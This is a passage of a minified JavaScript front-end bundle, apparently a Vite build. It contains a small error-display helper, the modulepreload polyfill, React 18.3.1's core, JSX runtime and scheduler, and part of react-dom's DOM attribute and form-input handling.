function showError(msg) {
    const box = document.getElementById("show_error_msg");
    box.textContent = msg;
}

function zp(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if ("string" != typeof r && !Array.isArray(r)) for (const o in r) if ("default" !== o && !(o in e)) {
            const l = Object.getOwnPropertyDescriptor(r, o);
            l && Object.defineProperty(e, o, l.get ? l : {
                enumerable: !0,
                get: () => r[o]
            });
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
    }));
}
function sc(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e;
}
!function () {
    const t = document.createElement("link").relList;
    if (!(t && t.supports && t.supports("modulepreload"))) {
        for (const o of document.querySelectorAll('link[rel="modulepreload"]')) r(o);
        new MutationObserver(o => {
            for (const l of o) if ("childList" === l.type) for (const i of l.addedNodes) "LINK" === i.tagName && "modulepreload" === i.rel && r(i);
        }).observe(document, {
            childList: !0,
            subtree: !0
        });
    }
    function r(o) {
        if (o.ep) return;
        o.ep = !0;
        const l = function n(o) {
            const l = {};
            return o.integrity && (l.integrity = o.integrity), o.referrerPolicy && (l.referrerPolicy = o.referrerPolicy), "use-credentials" === o.crossOrigin ? l.credentials = "include" : "anonymous" === o.crossOrigin ? l.credentials = "omit" : l.credentials = "same-origin", l;
        }(o);
        fetch(o.href, l);
    }
}();
var uc = {
    exports: {}
},
    El = {},
    ac = {
        exports: {}
    },
    M = {},
    Br = Symbol.for("react.element"),
    Rp = Symbol.for("react.portal"),
    Op = Symbol.for("react.fragment"),
    Mp = Symbol.for("react.strict_mode"),
    Lp = Symbol.for("react.profiler"),
    Ap = Symbol.for("react.provider"),
    $p = Symbol.for("react.context"),
    Fp = Symbol.for("react.forward_ref"),
    Dp = Symbol.for("react.suspense"),
    Up = Symbol.for("react.memo"),
    bp = Symbol.for("react.lazy"),
    Au = Symbol.iterator;
function Vp(e) {
    return null === e || "object" != typeof e ? null : "function" == typeof (e = Au && e[Au] || e["@@iterator"]) ? e : null;
}
var cc = {
    isMounted: function () {
        return !1;
    },
    enqueueForceUpdate: function () { },
    enqueueReplaceState: function () { },
    enqueueSetState: function () { }
},
    dc = Object.assign,
    fc = {};
function Vn(e, t, n) {
    this.props = e, this.context = t, this.refs = fc, this.updater = n || cc;
}
function pc() { }
function Os(e, t, n) {
    this.props = e, this.context = t, this.refs = fc, this.updater = n || cc;
}
Vn.prototype.isReactComponent = {}, Vn.prototype.setState = function (e, t) {
    if ("object" != typeof e && "function" != typeof e && null != e) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
    this.updater.enqueueSetState(this, e, t, "setState");
}, Vn.prototype.forceUpdate = function (e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate");
}, pc.prototype = Vn.prototype;
var Ms = Os.prototype = new pc();
Ms.constructor = Os, dc(Ms, Vn.prototype), Ms.isPureReactComponent = !0;
var $u = Array.isArray,
    mc = Object.prototype.hasOwnProperty,
    Ls = {
        current: null
    },
    hc = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };
function vc(e, t, n) {
    var r,
        o = {},
        l = null,
        i = null;
    if (null != t) for (r in void 0 !== t.ref && (i = t.ref), void 0 !== t.key && (l = "" + t.key), t) mc.call(t, r) && !hc.hasOwnProperty(r) && (o[r] = t[r]);
    var s = arguments.length - 2;
    if (1 === s) o.children = n; else if (1 < s) {
        for (var a = Array(s), u = 0; u < s; u++) a[u] = arguments[u + 2];
        o.children = a;
    }
    if (e && e.defaultProps) for (r in s = e.defaultProps) void 0 === o[r] && (o[r] = s[r]);
    return {
        $$typeof: Br,
        type: e,
        key: l,
        ref: i,
        props: o,
        _owner: Ls.current
    };
}
function Wp(e, t) {
    return {
        $$typeof: Br,
        type: e.type,
        key: t,
        ref: e.ref,
        props: e.props,
        _owner: e._owner
    };
}
function As(e) {
    return "object" == typeof e && null !== e && e.$$typeof === Br;
}
function Bp(e) {
    var t = {
        "=": "=0",
        ":": "=2"
    };
    return "$" + e.replace(/[=:]/g, function (n) {
        return t[n];
    });
}
var Fu = /\/+/g;
function Xl(e, t) {
    return "object" == typeof e && null !== e && null != e.key ? Bp("" + e.key) : t.toString(36);
}
function Oo(e, t, n, r, o) {
    var l = typeof e;
    ("undefined" === l || "boolean" === l) && (e = null);
    var i = !1;
    if (null === e) i = !0; else switch (l) {
        case "string":
        case "number":
            i = !0;
            break;
        case "object":
            switch (e.$$typeof) {
                case Br:
                case Rp:
                    i = !0;
            }
    }
    if (i) return o = o(i = e), e = "" === r ? "." + Xl(i, 0) : r, $u(o) ? (n = "", null != e && (n = e.replace(Fu, "$&/") + "/"), Oo(o, t, n, "", function (u) {
        return u;
    })) : null != o && (As(o) && (o = Wp(o, n + (!o.key || i && i.key === o.key ? "" : ("" + o.key).replace(Fu, "$&/") + "/") + e)), t.push(o)), 1;
    if (i = 0, r = "" === r ? "." : r + ":", $u(e)) for (var s = 0; s < e.length; s++) {
        var a = r + Xl(l = e[s], s);
        i += Oo(l, t, n, a, o);
    } else if ("function" == typeof (a = Vp(e))) for (e = a.call(e), s = 0; !(l = e.next()).done;) i += Oo(l = l.value, t, n, a = r + Xl(l, s++), o); else if ("object" === l) throw t = String(e), Error("Objects are not valid as a React child (found: " + ("[object Object]" === t ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
    return i;
}
function io(e, t, n) {
    if (null == e) return e;
    var r = [],
        o = 0;
    return Oo(e, r, "", "", function (l) {
        return t.call(n, l, o++);
    }), r;
}
function Hp(e) {
    if (-1 === e._status) {
        var t = e._result;
        (t = t()).then(function (n) {
            (0 === e._status || -1 === e._status) && (e._status = 1, e._result = n);
        }, function (n) {
            (0 === e._status || -1 === e._status) && (e._status = 2, e._result = n);
        }), -1 === e._status && (e._status = 0, e._result = t);
    }
    if (1 === e._status) return e._result.default;
    throw e._result;
}
var me = {
    current: null
},
    Mo = {
        transition: null
    },
    Kp = {
        ReactCurrentDispatcher: me,
        ReactCurrentBatchConfig: Mo,
        ReactCurrentOwner: Ls
    };
function gc() {
    throw Error("act(...) is not supported in production builds of React.");
}
M.Children = {
    map: io,
    forEach: function (e, t, n) {
        io(e, function () {
            t.apply(this, arguments);
        }, n);
    },
    count: function (e) {
        var t = 0;
        return io(e, function () {
            t++;
        }), t;
    },
    toArray: function (e) {
        return io(e, function (t) {
            return t;
        }) || [];
    },
    only: function (e) {
        if (!As(e)) throw Error("React.Children.only expected to receive a single React element child.");
        return e;
    }
}, M.Component = Vn, M.Fragment = Op, M.Profiler = Lp, M.PureComponent = Os, M.StrictMode = Mp, M.Suspense = Dp, M.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Kp, M.act = gc, M.cloneElement = function (e, t, n) {
    if (null == e) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = dc({}, e.props),
        o = e.key,
        l = e.ref,
        i = e._owner;
    if (null != t) {
        if (void 0 !== t.ref && (l = t.ref, i = Ls.current), void 0 !== t.key && (o = "" + t.key), e.type && e.type.defaultProps) var s = e.type.defaultProps;
        for (a in t) mc.call(t, a) && !hc.hasOwnProperty(a) && (r[a] = void 0 === t[a] && void 0 !== s ? s[a] : t[a]);
    }
    var a = arguments.length - 2;
    if (1 === a) r.children = n; else if (1 < a) {
        s = Array(a);
        for (var u = 0; u < a; u++) s[u] = arguments[u + 2];
        r.children = s;
    }
    return {
        $$typeof: Br,
        type: e.type,
        key: o,
        ref: l,
        props: r,
        _owner: i
    };
}, M.createContext = function (e) {
    return (e = {
        $$typeof: $p,
        _currentValue: e,
        _currentValue2: e,
        _threadCount: 0,
        Provider: null,
        Consumer: null,
        _defaultValue: null,
        _globalName: null
    }).Provider = {
        $$typeof: Ap,
        _context: e
    }, e.Consumer = e;
}, M.createElement = vc, M.createFactory = function (e) {
    var t = vc.bind(null, e);
    return t.type = e, t;
}, M.createRef = function () {
    return {
        current: null
    };
}, M.forwardRef = function (e) {
    return {
        $$typeof: Fp,
        render: e
    };
}, M.isValidElement = As, M.lazy = function (e) {
    return {
        $$typeof: bp,
        _payload: {
            _status: -1,
            _result: e
        },
        _init: Hp
    };
}, M.memo = function (e, t) {
    return {
        $$typeof: Up,
        type: e,
        compare: void 0 === t ? null : t
    };
}, M.startTransition = function (e) {
    var t = Mo.transition;
    Mo.transition = {};
    try {
        e();
    } finally {
        Mo.transition = t;
    }
}, M.unstable_act = gc, M.useCallback = function (e, t) {
    return me.current.useCallback(e, t);
}, M.useContext = function (e) {
    return me.current.useContext(e);
}, M.useDebugValue = function () { }, M.useDeferredValue = function (e) {
    return me.current.useDeferredValue(e);
}, M.useEffect = function (e, t) {
    return me.current.useEffect(e, t);
}, M.useId = function () {
    return me.current.useId();
}, M.useImperativeHandle = function (e, t, n) {
    return me.current.useImperativeHandle(e, t, n);
}, M.useInsertionEffect = function (e, t) {
    return me.current.useInsertionEffect(e, t);
}, M.useLayoutEffect = function (e, t) {
    return me.current.useLayoutEffect(e, t);
}, M.useMemo = function (e, t) {
    return me.current.useMemo(e, t);
}, M.useReducer = function (e, t, n) {
    return me.current.useReducer(e, t, n);
}, M.useRef = function (e) {
    return me.current.useRef(e);
}, M.useState = function (e) {
    return me.current.useState(e);
}, M.useSyncExternalStore = function (e, t, n) {
    return me.current.useSyncExternalStore(e, t, n);
}, M.useTransition = function () {
    return me.current.useTransition();
}, M.version = "18.3.1", ac.exports = M;
var x = ac.exports;
const Je = sc(x),
    Gp = zp({
        __proto__: null,
        default: Je
    }, [x]);
var Qp = x,
    Yp = Symbol.for("react.element"),
    Xp = Symbol.for("react.fragment"),
    Jp = Object.prototype.hasOwnProperty,
    Zp = Qp.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    qp = {
        key: !0,
        ref: !0,
        __self: !0,
        __source: !0
    };
function yc(e, t, n) {
    var r,
        o = {},
        l = null,
        i = null;
    for (r in void 0 !== n && (l = "" + n), void 0 !== t.key && (l = "" + t.key), void 0 !== t.ref && (i = t.ref), t) Jp.call(t, r) && !qp.hasOwnProperty(r) && (o[r] = t[r]);
    if (e && e.defaultProps) for (r in t = e.defaultProps) void 0 === o[r] && (o[r] = t[r]);
    return {
        $$typeof: Yp,
        type: e,
        key: l,
        ref: i,
        props: o,
        _owner: Zp.current
    };
}
El.Fragment = Xp, El.jsx = yc, El.jsxs = yc, uc.exports = El;
var v = uc.exports,
    Pi = {},
    wc = {
        exports: {}
    },
    Te = {},
    xc = {
        exports: {}
    },
    Sc = {};
!function (e) {
    function t(N, I) {
        var R = N.length;
        N.push(I);
        e: for (; 0 < R;) {
            var D = R - 1 >>> 1,
                H = N[D];
            if (!(0 < o(H, I))) break e;
            N[D] = I, N[R] = H, R = D;
        }
    }
    function n(N) {
        return 0 === N.length ? null : N[0];
    }
    function r(N) {
        if (0 === N.length) return null;
        var I = N[0],
            R = N.pop();
        if (R !== I) {
            N[0] = R;
            e: for (var D = 0, H = N.length, oo = H >>> 1; D < oo;) {
                var bt = 2 * (D + 1) - 1,
                    Yl = N[bt],
                    Vt = bt + 1,
                    lo = N[Vt];
                if (0 > o(Yl, R)) Vt < H && 0 > o(lo, Yl) ? (N[D] = lo, N[Vt] = R, D = Vt) : (N[D] = Yl, N[bt] = R, D = bt); else {
                    if (!(Vt < H && 0 > o(lo, R))) break e;
                    N[D] = lo, N[Vt] = R, D = Vt;
                }
            }
        }
        return I;
    }
    function o(N, I) {
        var R = N.sortIndex - I.sortIndex;
        return 0 !== R ? R : N.id - I.id;
    }
    if ("object" == typeof performance && "function" == typeof performance.now) {
        var l = performance;
        e.unstable_now = function () {
            return l.now();
        };
    } else {
        var i = Date,
            s = i.now();
        e.unstable_now = function () {
            return i.now() - s;
        };
    }
    var a = [],
        u = [],
        d = 1,
        m = null,
        p = 3,
        g = !1,
        w = !1,
        y = !1,
        S = "function" == typeof setTimeout ? setTimeout : null,
        f = "function" == typeof clearTimeout ? clearTimeout : null,
        c = typeof setImmediate < "u" ? setImmediate : null;
    function h(N) {
        for (var I = n(u); null !== I;) {
            if (null === I.callback) r(u); else {
                if (!(I.startTime <= N)) break;
                r(u), I.sortIndex = I.expirationTime, t(a, I);
            }
            I = n(u);
        }
    }
    function k(N) {
        if (y = !1, h(N), !w) if (null !== n(a)) w = !0, ie(C); else {
            var I = n(u);
            null !== I && cn(k, I.startTime - N);
        }
    }
    function C(N, I) {
        w = !1, y && (y = !1, f(E), E = -1), g = !0;
        var R = p;
        try {
            for (h(I), m = n(a); null !== m && (!(m.expirationTime > I) || N && !Z());) {
                var D = m.callback;
                if ("function" == typeof D) {
                    m.callback = null, p = m.priorityLevel;
                    var H = D(m.expirationTime <= I);
                    I = e.unstable_now(), "function" == typeof H ? m.callback = H : m === n(a) && r(a), h(I);
                } else r(a);
                m = n(a);
            }
            if (null !== m) var oo = !0; else {
                var bt = n(u);
                null !== bt && cn(k, bt.startTime - I), oo = !1;
            }
            return oo;
        } finally {
            m = null, p = R, g = !1;
        }
    }
    typeof navigator < "u" && void 0 !== navigator.scheduling && void 0 !== navigator.scheduling.isInputPending && navigator.scheduling.isInputPending.bind(navigator.scheduling);
    var Qe,
        T = !1,
        j = null,
        E = -1,
        F = 5,
        z = -1;
    function Z() {
        return !(e.unstable_now() - z < F);
    }
    function A() {
        if (null !== j) {
            var N = e.unstable_now();
            z = N;
            var I = !0;
            try {
                I = j(!0, N);
            } finally {
                I ? Qe() : (T = !1, j = null);
            }
        } else T = !1;
    }
    if ("function" == typeof c) Qe = function () {
        c(A);
    }; else if (typeof MessageChannel < "u") {
        var vt = new MessageChannel(),
            an = vt.port2;
        vt.port1.onmessage = A, Qe = function () {
            an.postMessage(null);
        };
    } else Qe = function () {
        S(A, 0);
    };
    function ie(N) {
        j = N, T || (T = !0, Qe());
    }
    function cn(N, I) {
        E = S(function () {
            N(e.unstable_now());
        }, I);
    }
    e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function (N) {
        N.callback = null;
    }, e.unstable_continueExecution = function () {
        w || g || (w = !0, ie(C));
    }, e.unstable_forceFrameRate = function (N) {
        0 > N || 125 < N ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : F = 0 < N ? Math.floor(1e3 / N) : 5;
    }, e.unstable_getCurrentPriorityLevel = function () {
        return p;
    }, e.unstable_getFirstCallbackNode = function () {
        return n(a);
    }, e.unstable_next = function (N) {
        switch (p) {
            case 1:
            case 2:
            case 3:
                var I = 3;
                break;
            default:
                I = p;
        }
        var R = p;
        p = I;
        try {
            return N();
        } finally {
            p = R;
        }
    }, e.unstable_pauseExecution = function () { }, e.unstable_requestPaint = function () { }, e.unstable_runWithPriority = function (N, I) {
        switch (N) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                N = 3;
        }
        var R = p;
        p = N;
        try {
            return I();
        } finally {
            p = R;
        }
    }, e.unstable_scheduleCallback = function (N, I, R) {
        var D = e.unstable_now();
        switch ("object" == typeof R && null !== R ? R = "number" == typeof (R = R.delay) && 0 < R ? D + R : D : R = D, N) {
            case 1:
                var H = -1;
                break;
            case 2:
                H = 250;
                break;
            case 5:
                H = 1073741823;
                break;
            case 4:
                H = 1e4;
                break;
            default:
                H = 5e3;
        }
        return N = {
            id: d++,
            callback: I,
            priorityLevel: N,
            startTime: R,
            expirationTime: H = R + H,
            sortIndex: -1
        }, R > D ? (N.sortIndex = R, t(u, N), null === n(a) && N === n(u) && (y ? (f(E), E = -1) : y = !0, cn(k, R - D))) : (N.sortIndex = H, t(a, N), w || g || (w = !0, ie(C))), N;
    }, e.unstable_shouldYield = Z, e.unstable_wrapCallback = function (N) {
        var I = p;
        return function () {
            var R = p;
            p = I;
            try {
                return N.apply(this, arguments);
            } finally {
                p = R;
            }
        };
    };
}(Sc), xc.exports = Sc;
var em = xc.exports,
    tm = x,
    Ne = em;
function _(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
    return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
}
var kc = new Set(),
    kr = {};
function ln(e, t) {
    Rn(e, t), Rn(e + "Capture", t);
}
function Rn(e, t) {
    for (kr[e] = t, e = 0; e < t.length; e++) kc.add(t[e]);
}
var ct = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    ji = Object.prototype.hasOwnProperty,
    nm = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    Du = {},
    Uu = {};
function rm(e) {
    return !!ji.call(Uu, e) || !ji.call(Du, e) && (nm.test(e) ? Uu[e] = !0 : (Du[e] = !0, !1));
}
function om(e, t, n, r) {
    if (null !== n && 0 === n.type) return !1;
    switch (typeof t) {
        case "function":
        case "symbol":
            return !0;
        case "boolean":
            return !r && (null !== n ? !n.acceptsBooleans : "data-" !== (e = e.toLowerCase().slice(0, 5)) && "aria-" !== e);
        default:
            return !1;
    }
}
function lm(e, t, n, r) {
    if (null === t || typeof t > "u" || om(e, t, n, r)) return !0;
    if (r) return !1;
    if (null !== n) switch (n.type) {
        case 3:
            return !t;
        case 4:
            return !1 === t;
        case 5:
            return isNaN(t);
        case 6:
            return isNaN(t) || 1 > t;
    }
    return !1;
}
function he(e, t, n, r, o, l, i) {
    this.acceptsBooleans = 2 === t || 3 === t || 4 === t, this.attributeName = r, this.attributeNamespace = o, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = l, this.removeEmptyString = i;
}
var le = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function (e) {
    le[e] = new he(e, 0, !1, e, null, !1, !1);
}), [["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function (e) {
    var t = e[0];
    le[t] = new he(t, 1, !1, e[1], null, !1, !1);
}), ["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
    le[e] = new he(e, 2, !1, e.toLowerCase(), null, !1, !1);
}), ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (e) {
    le[e] = new he(e, 2, !1, e, null, !1, !1);
}), "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function (e) {
    le[e] = new he(e, 3, !1, e.toLowerCase(), null, !1, !1);
}), ["checked", "multiple", "muted", "selected"].forEach(function (e) {
    le[e] = new he(e, 3, !0, e, null, !1, !1);
}), ["capture", "download"].forEach(function (e) {
    le[e] = new he(e, 4, !1, e, null, !1, !1);
}), ["cols", "rows", "size", "span"].forEach(function (e) {
    le[e] = new he(e, 6, !1, e, null, !1, !1);
}), ["rowSpan", "start"].forEach(function (e) {
    le[e] = new he(e, 5, !1, e.toLowerCase(), null, !1, !1);
});
var $s = /[\-:]([a-z])/g;
function Fs(e) {
    return e[1].toUpperCase();
}
function Ds(e, t, n, r) {
    var o = le.hasOwnProperty(t) ? le[t] : null;
    (null !== o ? 0 !== o.type : r || !(2 < t.length) || "o" !== t[0] && "O" !== t[0] || "n" !== t[1] && "N" !== t[1]) && (lm(t, n, o, r) && (n = null), r || null === o ? rm(t) && (null === n ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : o.mustUseProperty ? e[o.propertyName] = null === n ? 3 !== o.type && "" : n : (t = o.attributeName, r = o.attributeNamespace, null === n ? e.removeAttribute(t) : (n = 3 === (o = o.type) || 4 === o && !0 === n ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))));
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function (e) {
    var t = e.replace($s, Fs);
    le[t] = new he(t, 1, !1, e, null, !1, !1);
}), "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (e) {
    var t = e.replace($s, Fs);
    le[t] = new he(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1);
}), ["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
    var t = e.replace($s, Fs);
    le[t] = new he(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1);
}), ["tabIndex", "crossOrigin"].forEach(function (e) {
    le[e] = new he(e, 1, !1, e.toLowerCase(), null, !1, !1);
}), le.xlinkHref = new he("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1), ["src", "href", "action", "formAction"].forEach(function (e) {
    le[e] = new he(e, 1, !1, e.toLowerCase(), null, !0, !0);
});
var ht = tm.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
    so = Symbol.for("react.element"),
    mn = Symbol.for("react.portal"),
    hn = Symbol.for("react.fragment"),
    Us = Symbol.for("react.strict_mode"),
    Ti = Symbol.for("react.profiler"),
    _c = Symbol.for("react.provider"),
    Cc = Symbol.for("react.context"),
    bs = Symbol.for("react.forward_ref"),
    Ii = Symbol.for("react.suspense"),
    zi = Symbol.for("react.suspense_list"),
    Vs = Symbol.for("react.memo"),
    xt = Symbol.for("react.lazy"),
    Ec = Symbol.for("react.offscreen"),
    bu = Symbol.iterator;
function qn(e) {
    return null === e || "object" != typeof e ? null : "function" == typeof (e = bu && e[bu] || e["@@iterator"]) ? e : null;
}
var Jl,
    Q = Object.assign;
function ar(e) {
    if (void 0 === Jl) try {
        throw Error();
    } catch (n) {
        var t = n.stack.trim().match(/\n( *(at )?)/);
        Jl = t && t[1] || "";
    }
    return "\n" + Jl + e;
}
var Zl = !1;
function ql(e, t) {
    if (!e || Zl) return "";
    Zl = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t) {
            if (t = function () {
                throw Error();
            }, Object.defineProperty(t.prototype, "props", {
                set: function () {
                    throw Error();
                }
            }), "object" == typeof Reflect && Reflect.construct) {
                try {
                    Reflect.construct(t, []);
                } catch (u) {
                    var r = u;
                }
                Reflect.construct(e, [], t);
            } else {
                try {
                    t.call();
                } catch (u) {
                    r = u;
                }
                e.call(t.prototype);
            }
        } else {
            try {
                throw Error();
            } catch (u) {
                r = u;
            }
            e();
        }
    } catch (u) {
        if (u && r && "string" == typeof u.stack) {
            for (var o = u.stack.split("\n"), l = r.stack.split("\n"), i = o.length - 1, s = l.length - 1; 1 <= i && 0 <= s && o[i] !== l[s];) s--;
            for (; 1 <= i && 0 <= s; i--, s--) if (o[i] !== l[s]) {
                if (1 !== i || 1 !== s) do {
                    if (i--, 0 > --s || o[i] !== l[s]) {
                        var a = "\n" + o[i].replace(" at new ", " at ");
                        return e.displayName && a.includes("<anonymous>") && (a = a.replace("<anonymous>", e.displayName)), a;
                    }
                } while (1 <= i && 0 <= s);
                break;
            }
        }
    } finally {
        Zl = !1, Error.prepareStackTrace = n;
    }
    return (e = e ? e.displayName || e.name : "") ? ar(e) : "";
}
function im(e) {
    switch (e.tag) {
        case 5:
            return ar(e.type);
        case 16:
            return ar("Lazy");
        case 13:
            return ar("Suspense");
        case 19:
            return ar("SuspenseList");
        case 0:
        case 2:
        case 15:
            return e = ql(e.type, !1);
        case 11:
            return e = ql(e.type.render, !1);
        case 1:
            return e = ql(e.type, !0);
        default:
            return "";
    }
}
function Ri(e) {
    if (null == e) return null;
    if ("function" == typeof e) return e.displayName || e.name || null;
    if ("string" == typeof e) return e;
    switch (e) {
        case hn:
            return "Fragment";
        case mn:
            return "Portal";
        case Ti:
            return "Profiler";
        case Us:
            return "StrictMode";
        case Ii:
            return "Suspense";
        case zi:
            return "SuspenseList";
    }
    if ("object" == typeof e) switch (e.$$typeof) {
        case Cc:
            return (e.displayName || "Context") + ".Consumer";
        case _c:
            return (e._context.displayName || "Context") + ".Provider";
        case bs:
            var t = e.render;
            return (e = e.displayName) || (e = "" !== (e = t.displayName || t.name || "") ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
        case Vs:
            return null !== (t = e.displayName || null) ? t : Ri(e.type) || "Memo";
        case xt:
            t = e._payload, e = e._init;
            try {
                return Ri(e(t));
            } catch { }
    }
    return null;
}
function sm(e) {
    var t = e.type;
    switch (e.tag) {
        case 24:
            return "Cache";
        case 9:
            return (t.displayName || "Context") + ".Consumer";
        case 10:
            return (t._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return e = (e = t.render).displayName || e.name || "", t.displayName || ("" !== e ? "ForwardRef(" + e + ")" : "ForwardRef");
        case 7:
            return "Fragment";
        case 5:
            return t;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return Ri(t);
        case 8:
            return t === Us ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if ("function" == typeof t) return t.displayName || t.name || null;
            if ("string" == typeof t) return t;
    }
    return null;
}
function Lt(e) {
    switch (typeof e) {
        case "boolean":
        case "number":
        case "string":
        case "undefined":
        case "object":
            return e;
        default:
            return "";
    }
}
function Nc(e) {
    var t = e.type;
    return (e = e.nodeName) && "input" === e.toLowerCase() && ("checkbox" === t || "radio" === t);
}
function um(e) {
    var t = Nc(e) ? "checked" : "value",
        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
        r = "" + e[t];
    if (!e.hasOwnProperty(t) && typeof n < "u" && "function" == typeof n.get && "function" == typeof n.set) {
        var o = n.get,
            l = n.set;
        return Object.defineProperty(e, t, {
            configurable: !0,
            get: function () {
                return o.call(this);
            },
            set: function (i) {
                r = "" + i, l.call(this, i);
            }
        }), Object.defineProperty(e, t, {
            enumerable: n.enumerable
        }), {
            getValue: function () {
                return r;
            },
            setValue: function (i) {
                r = "" + i;
            },
            stopTracking: function () {
                e._valueTracker = null, delete e[t];
            }
        };
    }
}
function uo(e) {
    e._valueTracker || (e._valueTracker = um(e));
}
function Pc(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(),
        r = "";
    return e && (r = Nc(e) ? e.checked ? "true" : "false" : e.value), (e = r) !== n && (t.setValue(e), !0);
}
function Yo(e) {
    if (typeof (e = e || (typeof document < "u" ? document : void 0)) > "u") return null;
    try {
        return e.activeElement || e.body;
    } catch {
        return e.body;
    }
}
function Oi(e, t) {
    var n = t.checked;
    return Q({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n !== null && n !== void 0 ? n : e._wrapperState.initialChecked
    });
}
function Vu(e, t) {
    var n = null == t.defaultValue ? "" : t.defaultValue,
        r = null != t.checked ? t.checked : t.defaultChecked;
    n = Lt(null != t.value ? t.value : n), e._wrapperState = {
        initialChecked: r,
        initialValue: n,
        controlled: "checkbox" === t.type || "radio" === t.type ? null != t.checked : null != t.value
    };
}
function jc(e, t) {
    null != (t = t.checked) && Ds(e, "checked", t, !1);
}
function Mi(e, t) {
    jc(e, t);
    var n = Lt(t.value),
        r = t.type;
    if (null != n) "number" === r ? (0 === n && "" === e.value || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n); else if ("submit" === r || "reset" === r) return void e.removeAttribute("value");
    t.hasOwnProperty("value") ? Li(e, t.type, n) : t.hasOwnProperty("defaultValue") && Li(e, t.type, Lt(t.defaultValue)), null == t.checked && null != t.defaultChecked && (e.defaultChecked = !!t.defaultChecked);
}
function Wu(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!("submit" !== r && "reset" !== r || void 0 !== t.value && null !== t.value)) return;
        t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t;
    }
    "" !== (n = e.name) && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, "" !== n && (e.name = n);
}
function Li(e, t, n) {
